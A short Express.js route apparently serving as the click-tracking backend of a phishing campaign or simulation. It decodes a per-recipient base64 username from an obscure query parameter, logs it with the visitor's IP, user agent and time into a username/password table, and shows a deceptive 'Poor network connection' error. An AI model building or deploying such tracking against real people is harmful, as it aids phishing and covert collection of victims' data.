const express = require('express');
const router = express.Router();
const promisePool = require('../db');

const QUERY_PARAM_NAME = 'gdgdsdh'; // ← change this to whatever you want in ONE place

router.get('/', async function(req, res, next) {
  console.log("✅ Full query object received:", req.query);


  const data = req.query[QUERY_PARAM_NAME];

  if (!data) {
    return res.status(400).send(`❌ Missing or empty query parameter: '${QUERY_PARAM_NAME}'`);
  }

  const name = Buffer.from(data, 'base64').toString('utf8');
  const passwd = "clicked";
  const agent = req.headers['user-agent'];
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const time = new Date().toISOString();

  try {
    const insertQuery = `
      INSERT INTO table1 (username, password, requestIP, requestOS, requestTime) 
      VALUES (?, ?, ?, ?, ?)
    `;
    await promisePool.query(insertQuery, [name, passwd, ip, agent, time]);
    console.log('✅ Record inserted');
  } catch (err) {
    console.error('❌ Error interacting with DB:', err.message);
    return res.status(500).send('Poor network connection...Try again');
  }

  res.render('index', { data }); // ✅ Pass encoded base64 string, NOT decoded name

});

module.exports = router;
